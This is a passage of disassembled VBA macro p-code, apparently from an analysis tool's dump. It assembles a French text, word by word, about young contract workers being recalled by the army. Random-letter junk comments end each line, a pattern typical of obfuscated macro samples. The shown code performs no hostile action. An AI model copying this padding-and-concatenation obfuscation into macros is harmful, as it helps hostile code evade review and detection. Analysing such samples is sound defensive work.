' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "actuelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	BoS 0x0000 
' 	Ld g5 
' 	LitStr 0x0007 "encore:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "accordé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "report"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "incorporation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	QuoteRem 0x0068 0x0005 " wbrt"
' Line #161:
' 	LineCont 0x0020 05 00 00 00 0B 00 00 00 2A 00 00 00 73 00 00 00 C6 00 00 00 DE 00 00 00 04 01 00 00 20 01 00 00
' 	Ld g5 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "2"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	BoS 0x0000 
' 	LitStr 0x0006 "jeunes"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ayant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "obtenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	Ld e1 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "intention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rappeler"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "beau"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	Ld e1 
' 	LitStr 0x0004 "leur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "carrière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "professionnelle."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "implications"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	Ld e1 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "catastrophiques:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Vivre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	St m4 
' 	QuoteRem 0x0024 0x0009 " dkekramf"
' Line #162:
' 	LineCont 0x0004 1F 00 00 00
' 	Ld m4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "permet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "engagements,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "dettes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St m4 
' 	QuoteRem 0x004B 0x0008 " whhhftu"
' Line #163:
' 	LineCont 0x0004 24 00 00 00
' 	LitStr 0x0006 "impôts"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "déjà"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "difficiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assumer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	St b3 
' 	QuoteRem 0x0040 0x000A " tsrbvsdku"
' Line #164:
' 	LineCont 0x0008 0A 00 00 00 11 00 00 00
' 	Ld b3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "début"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "active"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "normal."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b3 
' 	QuoteRem 0x0051 0x0006 " oucef"
' Line #165:
' 	LineCont 0x000C 0E 00 00 00 14 00 00 00 37 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "pratiquer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "activité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "professionnelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	BoS 0x0000 
' 	Ld d4 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "implique"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "également"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "expérience"
' 	Add 
' 	St d4 
' 	QuoteRem 0x00C1 0x0006 " empgn"
' Line #166:
' 	LineCont 0x0004 27 00 00 00
' 	Ld d4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utile,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "nécessité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "période"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	QuoteRem 0x001E 0x0010 " ejpxrgyactdnmhz"
' Line #167:
' 	LineCont 0x0004 03 00 00 00
' 	LitStr 0x0002 "de"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "réadaptation,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "modification"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "projet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "professionnel"
' 	Add 
' 	St f7 
' 	QuoteRem 0x009D 0x0006 " cprot"
' Line #168:
' 	LineCont 0x0004 25 00 00 00
' 	Ld f7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "inquantifiable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "colère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "employeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	QuoteRem 0x005C 0x0010 " jfluhakyxlqborq"
' Line #169:
' 	LineCont 0x0014 22 00 00 00 56 00 00 00 6C 00 00 00 73 00 00 00 EC 00 00 00
' 	Ld f7 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "traduira,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "intentionnellement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "non,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "par"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	BoS 0x0000 
' 	Ld f7 
' 	LitStr 0x000E "ralentissement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "évolution"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "carrière."
' 	Add 
' 	St f7 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "soit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bonnement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "impossible"
' 	Add 
' 	St i3 
' 	BoS 0x0000 
' 	Ld i3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "loyer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	BoS 0x0000 
' 	Ld i3 
' 	LitStr 0x0005 "cette"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "période,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	QuoteRem 0x0044 0x000A " ravslkqoh"
' Line #170:
' 	LineCont 0x000C 0A 00 00 00 19 00 00 00 34 00 00 00
' 	LitStr 0x0001 "l"
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "abandon"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "logement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "irrémédiable."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "prendra"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "alors"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	BoS 0x0000 
' 	Ld g2 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "charge"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "déménagement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "garde-meuble"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	QuoteRem 0x00CC 0x000B " fbmgyhosru"
' Line #171:
' 	LineCont 0x0008 11 00 00 00 18 00 00 00
' 	Ld g2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "recherche"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nouvel"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement?"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	QuoteRem 0x005B 0x0010 " lgayodszijtyiwu"
' Line #172:
' 	LineCont 0x0008 50 00 00 00 6C 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "bas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "durant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "longs"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	QuoteRem 0x0041 0x000E " jxsmnlcrfvwyy"
' Line #173:
' 	LineCont 0x0010 34 00 00 00 71 00 00 00 98 00 00 00 A3 00 00 00
' 	Ld e5 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rêve"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "entrain"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0005 "bâtir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
